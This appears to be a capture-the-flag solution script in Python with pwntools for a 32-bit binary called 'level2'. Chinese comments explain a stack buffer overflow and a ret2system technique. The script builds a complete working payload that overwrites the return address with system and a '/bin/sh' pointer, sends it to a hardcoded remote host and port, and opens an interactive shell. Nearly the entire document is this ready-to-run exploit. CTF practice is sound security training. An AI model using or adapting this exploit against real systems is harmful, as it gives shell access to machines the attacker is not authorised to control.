"""
>>> checksec level2
[*] 'level2'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE


ssize_t vulnerable_function()
{
  char buf; // [esp+0h] [ebp-88h]

  system("echo Input:");
  return read(0, &buf, 0x100u);
}


存在栈溢出，程序中有 system 函数 和 /bin/sh 字符串
根据函数调用约定，32 位程序函数的参数是放在栈上的，因此可以通过伪造一个调用 system(“/bin/sh”) 的栈结构来 get shell
"""
from pwn import *

# r = process("level2")
r = remote("111.198.29.45", 31766)

print(r.recvline())

elf = ELF("level2")
payload = b"a" * (0x88 + 4) + p32(elf.sym[b'system']) + b"0000"  + p32(next(elf.search("/bin/sh")))

r.send(payload)
r.interactive()
